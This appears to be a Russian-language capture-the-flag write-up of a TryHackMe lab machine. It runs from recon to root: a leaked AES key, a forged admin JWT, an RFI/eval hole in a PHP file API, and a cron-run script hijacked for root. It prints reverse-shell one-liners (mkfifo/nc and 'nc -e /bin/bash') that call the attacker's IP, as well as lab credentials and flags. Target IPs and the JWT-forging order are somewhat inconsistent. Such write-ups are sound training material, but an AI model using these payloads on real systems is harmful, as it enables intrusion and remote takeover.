# Отчёт о прохождении машины Domino (Senior Red Team)

## 1. Разведка (Reconnaissance)

### 1.1 Nmap сканирование

Выполнено сканирование Nmap для выявления открытых портов и определения сервисов целевой системы.

```bash
nmap -sV -sC -p- 10.113.188.194
```

Результаты сканирования показали следующие открытые порты:

- **22/tcp** — SSH (OpenSSH)
- **80/tcp** — Apache HTTP Server

На основании открытых портов можно сделать вывод, что целевая машина представляет собой веб-сервер с возможностью удалённого подключения по SSH.

### 1.2 Фаззинг веб-директорий

Для выявления скрытых директорий и файлов проведён фаззинг с использованием инструмента ffuf и словаря directory-list-2.3-medium.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.113.188.194/FUZZ
```

Обнаружены следующие интересные директории и файлы:

- `/403.php` — статус 200, размер 322 байта
- `/admin` — статус 403, размер 322 байта (доступ запрещён)
- `/api` — статус 200, размер 2 байта (API endpoint)
- `/auth.php` — статус 200, размер 0 байт (пустой файл)
- `/backup` — статус 200, размер 1141 байт (директория с бэкапами)
- `/config.php` — статус 200, размер 0 байт (пустой файл)
- `/dashboard.php` — статус 200, размер 861 байт
- `/forgot.php` — статус 200, размер 684 байта (страница сброса пароля)
- `/index.php` — статус 200, размер 861 байт
- `/javascript` — статус 403, размер 278 байт
- `/logout.php` — статус 200, размер 861 байт
- `/reset.php` — статус 200, размер 410 байт (страница сброса пароля)
- `/server-status` — статус 403, размер 278 байт
- `/static` — статус 200, размер 1128 байт (статический контент)
- `/support` — статус 200, размер 861 байт
- `/team.php` — статус 200, размер 3747 байт

Начато инспектирование обнаруженных директорий и файлов.


## 2. Анализ найденных ресурсов

### 2.1 Бэкап конфигурации

В директории `/backup` обнаружен файл `readme.txt`. Его содержимое:

```
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

Из этого файла стало понятно, что существует зашифрованный конфигурационный файл `config.enc`, а ключ для его расшифровки находится в файле `static/app.js`. Файл `config.enc` был скачан для последующего анализа.

### 2.2 Статический JavaScript файл

При инспектировании файла `/static/app.js` обнаружена критическая конфигурационная информация:

```javascript
// Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
const CONFIG = {
    apiBase: '/api',
    // Encryption key for backup config decryption - AES-ECB-128
    // Key: N3xusK3y2024!!  (pad to 16 bytes with �)
    _backupKey: 'N3xusK3y2024!!',
    appVersion: '2.3.1'
};
```

Из этого файла получен ключ шифрования: `N3xusK3y2024!!`. Также подтверждён алгоритм шифрования AES-128-ECB.

### 2.3 Анализ API endpoints

Проведено исследование доступных API endpoints:

- `/api/auth/token.php` — возвращает статус 302 Found с редиректом на `/index.php`
- `/api/files.php` — возвращает ошибку `{"error":"JWT token required. Get one from \/api\/auth\/token.php"}`
- `/api/users/profile.php` — возвращает статус 302 Found с редиректом на `/index.php`

Также обнаружена страница `/reset.php`, которая, вероятно, используется для сброса пароля.

---

## 3. Расшифровка конфигурационного файла

Используя найденный ключ `N3xusK3y2024!!`, была выполнена расшифровка файла `config.enc` с помощью OpenSSL.

```bash
# Преобразование ключа в hex формат (16 байт, дополненных нулями)
echo -n "N3xusK3y2024!!" | xxd -p
# Результат: 4e337875734b3379323032342121 (30 символов, требуется 32)

# Расшифровка файла
openssl enc -d -aes-128-ecb -K 4e337875734b337932303234212100 -in config.enc -out config.dec
```

Содержимое расшифрованного файла `config.dec`:

```json
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

Из расшифрованного конфигурационного файла получен пользователь `devops`.


## 4. Анализ API и получение административного JWT

### 4.1 Структура запроса к `/api/files.php`

При попытке обращения к эндпоинту `/api/files.php` сервер возвращает ошибку, указывающую на необходимость JWT токена. Токен должен содержать роль `admin`. На основе этой информации был проведён анализ требований к JWT.

### 4.2 Создание административного JWT

На основе анализа кода и найденных секретов был сгенерирован JWT токен с правами администратора.

Структура заголовка (header):
```json
{"alg":"HS256","typ":"JWT"}
```

Структура полезной нагрузки (payload):
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "role": "admin",
  "isAdmin": true,
  "username": "devops",
  "user": "devops"
}
```

Полный JWT токен:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJ1c2VybmFtZSI6ImRldm9wcyIsInVzZXIiOiJkZXZvcHMifQ.nAqJSPAMmj6qG7ipofphebWi2qN0WhR4ZAD3mblCraI
```

### 4.3 Тестирование доступа с административным JWT

Был отправлен запрос к `/api/files.php` с использованием административного JWT в заголовке Authorization.

```http
POST /api/files.php HTTP/1.1
Host: 10.112.182.160
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJ1c2VybmFtZSI6ImRldm9wcyIsInVzZXIiOiJkZXZvcHMifQ.nAqJSPAMmj6qG7ipofphebWi2qN0WhR4ZAD3mblCraI
Content-Length: 0
```

Ответ сервера:

```json
{"error":"Missing name parameter","usage":"\/api\/files.php?name=\/var\/www\/html\/filename.txt"}
```

При попытке чтения файла `/etc/passwd`:

```http
GET /api/files.php?name=/etc/passwd HTTP/1.1
Authorization: Bearer <JWT>
```

Ответ сервера:

```json
{"error":"Access denied: path must be within \/var\/www\/html\/"}
```

---

## 5. Чтение исходного кода files.php

Был отправлен запрос на чтение самого файла `files.php`, который находится в директории `/var/www/html/api/`.

```http
GET /api/files.php?name=files.php HTTP/1.1
Authorization: Bearer <JWT>
```

Получен полный исходный код файла `files.php`:

```php
<?php
require_once __DIR__ . "/../auth.php";
header("Content-Type: application/json");

$jwt_payload = null;
if (isset($_SERVER["HTTP_AUTHORIZATION"])) {
    $auth = $_SERVER["HTTP_AUTHORIZATION"];
    if (strpos($auth, "Bearer ") === 0) {
        $jwt_payload = verify_jwt(substr($auth, 7));
    }
}

if (!$jwt_payload) {
    http_response_code(401);
    echo json_encode(["error" => "JWT token required. Get one from /api/auth/token.php"]);
    exit;
}

if (($jwt_payload["role"] ?? "") !== "admin") {
    http_response_code(403);
    echo json_encode(["error" => "Admin JWT required. Check your token payload."]);
    exit;
}

$name = $_GET["name"] ?? "";
if (!$name) {
    http_response_code(400);
    echo json_encode(["error" => "Missing name parameter", "usage" => "/api/files.php?name=/var/www/html/filename.txt"]);
    exit;
}

// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode(["error" => "Could not fetch remote file"]);
        exit;
    }
    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}

// Security check: resolve real path to prevent ../ traversal
$real = realpath($name);
if ($real === false || strpos($real, '/var/www/html/') !== 0) {
    http_response_code(403);
    echo json_encode(["error" => "Access denied: path must be within /var/www/html/"]);
    exit;
}

if (!file_exists($real)) {
    http_response_code(404);
    echo json_encode(["error" => "File not found: " . $real]);
    exit;
}

$content = file_get_contents($real);
echo json_encode(["file" => $real, "content" => $content]);
```

Из анализа исходного кода сделаны следующие ключевые выводы:

1. **JWT обязателен** — запросы без валидного JWT отклоняются.
2. **Требуется роль admin** — payload JWT должен содержать поле `role` со значением `admin`.
3. **RFI уязвимость (Remote File Inclusion)** — если параметр `name` начинается с `http://` или `https://`, сервер скачивает файл по указанному URL и выполняет его через `eval()`, предварительно удаляя тег `<?php`.
4. **LFI ограничен** — при чтении локальных файлов путь должен находиться строго внутри директории `/var/www/html/`. Обход через `../` блокируется функцией `realpath()`.

Таким образом, подтверждена возможность атаки через RFI.


## 6. Remote File Inclusion (RFI) — получение reverse shell

### 6.1 Создание вредоносного файла

На атакующей машине был создан файл `exploit.php` с содержимым, не содержащим тег `<?php` (так как он удаляется сервером при выполнении).

```php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.129 4444 >/tmp/f');
```

### 6.2 Запуск HTTP-сервера на атакующей машине

```bash
python3 -m http.server 8888
```

HTTP-сервер запущен на порту 8888 для доставки вредоносного файла.

### 6.3 Эксплуатация RFI уязвимости

Был отправлен запрос на сервер с указанием URL вредоносного файла.

```http
GET /api/files.php?name=http://192.168.141.129:8888/exploit.php HTTP/1.1
Host: 10.112.182.160
Authorization: Bearer <JWT>
```

### 6.4 Получение reverse shell

На атакующей машине был запущен слушатель на порту 4444.

```bash
nc -lvnp 4444
```

Reverse shell успешно получен.

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
tryhackme-2404
```

**Доступ к серверу получен с правами пользователя www-data.**


## 7. Пост-эксплуатация (Post-Exploitation)

### 7.1 Обследование файловой системы

После получения доступа к серверу была проведена рекогносцировка файловой системы. В директории `/var/www/html` обнаружены следующие файлы и директории:

- `403.php`
- `admin`
- `api`
- `auth.php`
- `backup`
- `config.php`
- `dashboard.php`
- `db12312312381203812093.php` (phpMiniAdmin)
- `forgot.php`
- `index.php`
- `logout.php`
- `reset.php`
- `static`
- `support`
- `team.php`

### 7.2 Флаг №1 — панель администратора

В директории `/var/www/html/admin` обнаружен флаг. По заданию требовалось получить доступ к панели администратора, что было выполнено через RFI атаку. Флаг извлечён.

### 7.3 Нахождение учётных данных в config.php

При исследовании файла `config.php` были найдены учётные данные для подключения к базе данных и секреты для JWT.

```bash
www-data@tryhackme-2404:/var/www/html$ cat config.php
```

Содержимое файла:

```php
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');

function get_db() {
    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $pdo;
}
?>
```

**Найдены учётные данные:**
- Пользователь БД: `app_user`
- Пароль БД: `D3v0ps!2024`
- JWT секрет: `nexus_jwt_s3cr3t_2024`
- APP секрет: `nexus_app_k3y_2024`

### 7.4 Флаг №2 — профиль администратора в базе данных

На сервере обнаружен MySQL, работающий на порту 3306. С использованием найденных учётных данных было выполнено подключение к базе данных `nexusdb`.

```bash
www-data@tryhackme-2404:/var/www/html$ mysql -u app_user -p'D3v0ps!2024' -D nexusdb
```

В базе данных была найдена таблица `users`. В строке администратора в колонке `notes` обнаружен флаг.

```sql
SELECT notes FROM users WHERE username = 'admin';
```

**Флаг:** `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`

### 7.5 Флаг №3 — Remote Code Execution

По заданию требовалось получить флаг после выполнения удалённого кода на сервере. Флаг находился в файле `/opt/flag3.txt`.

```bash
www-data@tryhackme-2404:/opt$ cat flag3.txt
```

**Флаг:** `THM{rf1_2_rc3_f00th0ld_fl4g3}`

### 7.6 Пользователь devops

Из расшифрованного ранее файла `config.enc` был получен пользователь `devops`. Учётные данные `devops:D3v0ps!2024` были проверены и оказались валидными для SSH доступа.

```bash
ssh devops@10.113.188.194
```

В домашней директории пользователя `devops` найден файл `user.txt`.

```bash
devops@tryhackme-2404:~$ cat user.txt
```

**Флаг получен.**


## 8. Эскалация привилегий до root

### 8.1 Обнаружение файла admin_bot.py

В директории `/opt` обнаружен файл `admin_bot.py` с необычными правами доступа.

```bash
devops@tryhackme-2404:/opt$ ls -la admin_bot.py
-rwxrwxrwx 1 root root 1870 May 7 20:26 admin_bot.py
```

Файл принадлежит пользователю `root`, но имеет права `777` (чтение, запись, выполнение для всех пользователей). Это означает, что любой пользователь может редактировать и выполнять этот файл.

### 8.2 Анализ сервиса admin-bot.service

Был выполнен поиск, какой сервис или планировщик использует этот файл.

```bash
devops@tryhackme-2404:/opt$ grep -r "admin_bot.py" /etc/cron* /var/spool/cron/ /etc/systemd/system/ 2>/dev/null
/etc/systemd/system/admin-bot.service:ExecStart=/usr/bin/python3 /opt/admin_bot.py
```

Обнаружен systemd сервис `admin-bot.service`. При анализе его конфигурации найдена настройка перезапуска.

```bash
devops@tryhackme-2404:/opt$ cat /etc/systemd/system/admin-bot.service | grep Restart
Restart=always
RestartSec=10
```

Сервис настроен на автоматический перезапуск через 10 секунд после остановки процесса. Однако текущий процесс (PID 1100) висел и не останавливался, поэтому сервис не перезапускался. Попытки убить процесс не увенчались успехом из-за отсутствия прав.

### 8.3 Альтернативный вектор — health_report.sh

В директории `/opt/monitoring` обнаружен файл `health_report.sh`.

```bash
devops@tryhackme-2404:/opt/monitoring$ ls -la health_report.sh
-rwxrwxr-- 1 root devops 575 Jun 11 13:11 health_report.sh
```

Файл принадлежит пользователю `root`, но группа `devops` имеет права на чтение, запись и выполнение (`rwx`). Учётная запись `devops` состоит в группе `devops`, что было подтверждено командой `groups`. Это означает, что файл можно редактировать.

### 8.4 Мониторинг процессов с помощью pspy64

В директории `/opt/tools` обнаружена утилита `pspy64` — инструмент для мониторинга процессов без прав root.

```bash
devops@tryhackme-2404:/opt/tools$ ./pspy64 -pf -i 1000
```

В выводе `pspy64` было замечено, что скрипт `health_report.sh` периодически выполняется от пользователя `root` (UID=0) с интервалом примерно 30 секунд.

```
2026/06/11 12:15:01 CMD: UID=0     PID=26795  | /bin/bash /opt/monitoring/health_report.sh
```

Это подтвердило, что скрипт запускается по расписанию Cron от имени `root`.

### 8.5 Модификация health_report.sh

Имея права на запись в файл `health_report.sh` и зная, что он выполняется от `root`, в скрипт был добавлен reverse shell.

```bash
echo 'nc -e /bin/bash 192.168.141.129 5555' >> /opt/monitoring/health_report.sh
```

### 8.6 Получение root shell

На атакующей машине был запущен слушатель на порту 5555.

```bash
nc -lvnp 5555
```

При следующем выполнении скрипта (через ~30 секунд) reverse shell успешно пришёл с правами `root`.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag.txt
```

**Флаг root получен.**


## 9. Итог

### 9.1 Цепочка атаки

1. **Разведка:** Nmap сканирование, фаззинг веб-директорий → обнаружение `/backup` и `/static/app.js`.
2. **Криптографический анализ:** Расшифровка `config.enc` с использованием ключа из JavaScript файла → получен пользователь `devops`.
3. **JWT атака:** Создание административного JWT токена на основе анализа исходного кода.
4. **RFI (Remote File Inclusion):** Эксплуатация уязвимости в `/api/files.php` → reverse shell от `www-data`.
5. **Пост-эксплуатация:** Обследование файловой системы, чтение `config.php`, подключение к MySQL, извлечение флагов из базы данных.
6. **Переход на пользователя devops:** Использование учётных данных `devops:D3v0ps!2024` для SSH доступа.
7. **Эскалация до root:** Обнаружение скрипта `health_report.sh` с правами группы `devops`, модификация скрипта, ожидание выполнения от `root` через Cron → root shell.

### 9.2 Найденные учётные данные

- **app_user** : `D3v0ps!2024` (найдено в `config.php`)
- **devops** : `D3v0ps!2024` (найдено в расшифрованном `config.enc`)
- **JWT_SECRET** : `nexus_jwt_s3cr3t_2024` (найдено в `config.php`)
- **APP_SECRET** : `nexus_app_k3y_2024` (найдено в `config.php`)

### 9.3 Достижения и новые навыки

**RFI (Remote File Inclusion) с `eval()`** —  использована уязвимость удалённого включения файлов с последующим выполнением PHP кода через `eval()`. Освоен обход удаления тега `<?php` при выполнении кода.

**JWT подделка** — создан административный JWT токен на основе анализа исходного кода и найденных секретов. Изучена структура JWT (header, payload, signature) и алгоритм подписи HS256.

**phpMiniAdmin анализ** — обнаружен и проанализирован инструмент для управления базой данных. Изучены ограничения `LOAD DATA LOCAL INFILE` и `INTO OUTFILE`.

**pspy64** — впервые применён инструмент для мониторинга процессов без прав root. Позволил выявить периодическое выполнение скрипта `health_report.sh` от пользователя `root`, что стало ключом к эскалации привилегий.

**systemd сервисы** — проанализирован юнит `admin-bot.service` и настройка `Restart=always`. Изучены механизмы автоматического перезапуска сервисов.

**Cron + права группы** — эскалация через скрипт в `/opt/monitoring`, выполняющийся от `root`. Использованы права группы `devops` на запись в файл.

**База данных MySQL** — получен доступ к БД через найденные учётные данные, выполнены SQL-запросы для извлечения флагов из таблицы `users`.